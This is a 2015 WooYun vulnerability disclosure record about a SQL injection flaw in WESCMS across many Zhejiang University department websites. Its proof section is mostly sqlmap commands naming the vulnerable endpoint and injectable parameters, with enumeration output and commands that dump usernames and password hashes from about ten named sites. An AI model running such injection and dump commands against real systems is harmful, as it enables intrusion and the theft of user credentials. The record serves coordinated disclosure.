{"id": 70159, "wybug_id": "wooyun-2015-0134886", "wybug_title": "浙江大学多个网站存在通用型SQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "慢慢", "wybug_date": "2015-08-22 21:12", "wybug_open_date": "2015-10-09 10:10", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-25：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-09：\t细节向公众公开  简要描述： 浙江大学多个网站使用不靠谱的CMS导致SQL注入。 详细说明：  浙江大学多个网站使用不靠谱的CMS导致SQL注入。   漏洞证明：  以浙江大学化学系为例详细说明：\nsqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dbs\n得到结果\navailable databases [3]:[*] chem[*] information_schema[*] test\n选择chem继续深入\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" -D chem --tables\n得出结果\nDatabase: chem[79 tables]+-------------------------+| adodbseq                || daoshi                  || daoshi_fufeipd          || daoshi_liushui          || member                  || member_group            || member_profile          || poll_config             || poll_log                || poll_option             || poll_poll               || sc_arrangement          || sc_config               || sc_datesector           || sc_rooms                || tbladvertisement        || tblarticle              || tblarticle_remark       || tblauditflow            || tblauditflow_status     || tblauditflow_step       || tblclass_template       || tblcolumns              || tblcounter              || tblcounter_daily        || tblcounter_online       || tblcp_class             || tblcp_class_field       || tblcp_class_relation    || tblcp_class_validator   || tblcp_constraint        || tblcp_constraint_bind   || tblcp_datatype          || tblcp_datatype_item     || tblcp_domain_validator  || tblcrons                || tblcustom_form          || tblcustom_form_bind     || tblcustom_form_cc       || tblcustom_form_field    || tblcustom_form_tab      || tblcustomise            || tbldashboard            || tbldashboard_plugins    || tbldistrictprivilege    || tblevent                || tblgroup                || tblguestbook            || tblkeywords             || tbllink                 || tbllogin                || tbllogs                 || tblobject_attachment    || tblobject_counter       || tblobject_keywords      || tblobject_note          || tblobject_propertysheet || tblpersistent           || tblprivilege            || tblprivilege_atoms      || tblproc                 || tblprofile_fields       || tblroom_arrangement     || tblroom_datesector      || tblroom_login_config    || tblroom_rooms           || tblseq_cp_class         || tblsoft                 || tblsubject              || tblsubjectarticle       || tbluser_preference      || tblusergroup            || yiqi_customfrom_bind    || yiqitimeset             || yiqiyy                  || yiqiyy_yuyueqrsj        || yiqiyy_yuyuesj          || youjianmb               || yuyue_revise_log        |+-------------------------+\n然后挑选tbllogin进行下一步\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" -T tbllogin -D chem --threads=10 --columns\n得出结果\n+-------------+--------------+| Column      | Type         |+-------------+--------------+| address     | varchar(255) || birthday    | int(11)      || branch      | varchar(50)  || contact     | varchar(50)  || customize1  | varchar(255) || customize2  | varchar(255) || customize3  | varchar(255) || customize4  | varchar(255) || customize5  | varchar(255) || customize6  | text         || customize7  | text         || descri      | varchar(100) || duty        | varchar(200) || email       | varchar(50)  || gender      | int(11)      || id          | int(11)      || last_visit  | int(11)      || lock_flag   | int(11)      || mobile      | varchar(50)  || msn         | varchar(50)  || name        | varchar(50)  || password    | char(32)     || qq          | varchar(20)  || regdate     | int(11)      || tele        | varchar(50)  || unit        | varchar(50)  || user_type   | int(11)      || username    | varchar(50)  || visit_count | int(11)      || zip         | varchar(30)  |+-------------+--------------+\n然后最后一步\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dump -C id,username,password -T tbllogin -D chem --threads=10\n别人的密码就不写了，上一张截图证明：\n\n浙江大学其他网站的漏洞证明：1. 浙江大学本科生院\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dump -C id,username,password -T tbllogin -D bksy --threads=10\n有很多123456\n\n2. 浙江大学研究生院\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dump -C id,username,password -T tbllogin -D grs --threads=10\n3. 浙江大学人事处\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dump -C id,username,password -T tbllogin -D hr --threads=10\n4. 浙江大学图书馆\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dump -C id,username,password -T tbllogin -D libweb --threads=10\n5. 浙江大学物理系\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dump -C id,username,password -T tbllogin -D physics --threads=10\n6. 浙江大学化学工程与生物学院\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dump -C id,username,password -T tbllogin -D che --threads=10\n7. 浙江大学经济学院（没想到经济学院竟然是chem）\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dump -C id,username,password -T tbllogin -D chem --threads=10\n8. 浙江大学城市学院图书馆\npython sqlmap.py -u \"http://**.**.**.**//wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dump -C id,username,password -T tbllogin -D lib --threads=10\n9. 浙江大学生命科学研究院\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dump -C id,username,password -T tbllogin -D lsi --threads=10\n10. 浙江大学电气工程学院\npython sqlmap.py -u \"http://**.**.**.**/wescms/sys/order_adjust.php\" --data=\"id_f=id&order_f=qq&id=1*&dir=up&table=tbllogin\" --dump -C id,username,password -T tbllogin -D ee --threads=10\n同类型的SQL漏洞在浙江大学的网站中还存在着很多，几乎所有使用了WESCMS的网站都有这个漏洞。   修复方案：  尽量更换CMS，虽然不太可能……   版权声明：转载请注明来源 慢慢@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-08-25 10:09 厂商回复：     CNVD确认并复现所述 情况，已经转由CNCERT向教育网应急组织赛尔网络公司通报. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}